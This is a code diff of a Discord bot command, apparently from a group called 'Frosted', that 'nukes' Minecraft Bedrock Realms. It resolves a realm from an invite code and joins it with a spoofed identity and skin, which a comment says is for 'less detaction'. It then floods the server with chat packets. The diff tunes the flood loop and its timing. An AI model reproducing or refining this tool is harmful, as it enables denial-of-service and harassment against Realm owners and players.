@@ -52,19 +52,18 @@ module.exports = {
             }
             
             const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
-        const isWhitelisted = whitelist.some(entry => entry.realmCode === invite);
-        if (isWhitelisted) {
-            return interaction.editReply({
-                embeds: [
-                    new EmbedBuilder()
-                        .setTitle('Frosted Error')
-                        .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
-                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
-                        .setThumbnail(config.embeds.footerurl)
-                        .setColor(config.embeds.color)
-                ]
-            });
-        }
+            if (whitelist.includes(invite)) {
+                return interaction.editReply({
+                    embeds: [
+                        new EmbedBuilder()
+                            .setTitle('Frosted Error')
+                            .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
+                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
+                            .setThumbnail(config.embeds.footerurl)
+                            .setColor(config.embeds.color)
+                    ]
+                });
+            }
 
             const realm = await dumprealm(invite);
             if (!realm) {
@@ -154,7 +153,7 @@ module.exports = {
                     PrimaryUser: false,
                     SelfSignedId: uuidv4(),
                     ThirdPartyName: "§cdiscord.gg/frosted",
-                    ThirdPartyNameOnly: true,
+                    ThirdPartyNameOnly: false,
                     TrustedSkin: true,
                     ...skinData // costume skin for less detaction
                 },
@@ -222,8 +221,8 @@ module.exports = {
 
                     setTimeout(() => {
                         if (disconnected) return;
-                        for (let i = 0; i < 400; i++) {
-                            client.write('text', {
+                        for (let i = 0; i < 50; i++) {
+                            client.queue('text', {
                                 filtered_message: '',
                                 type: 'chat',
                                 needs_translation: false,
@@ -233,7 +232,7 @@ module.exports = {
                                 platform_chat_id: '0',
                             });
                         }
-                    }, 0);
+                    }, 2000);
 
                     setTimeout(() => {
                         if (!disconnected) {
